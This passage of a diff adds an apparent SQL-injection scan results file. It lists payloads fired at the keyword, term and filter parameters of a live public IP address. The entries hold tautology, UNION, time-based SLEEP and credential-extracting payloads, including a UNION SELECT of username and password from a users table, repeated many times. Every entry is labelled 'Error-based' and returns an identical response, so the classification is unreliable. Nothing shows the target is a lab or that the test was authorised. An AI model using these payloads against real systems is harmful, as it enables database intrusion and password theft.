+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "keyword",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "term",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "1' AND SLEEP(4)--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  },
+  {
+    "url": "http://52.247.225.51/",
+    "param": "filter",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "status_code": 200,
+    "response_length": 24340
+  }
+]
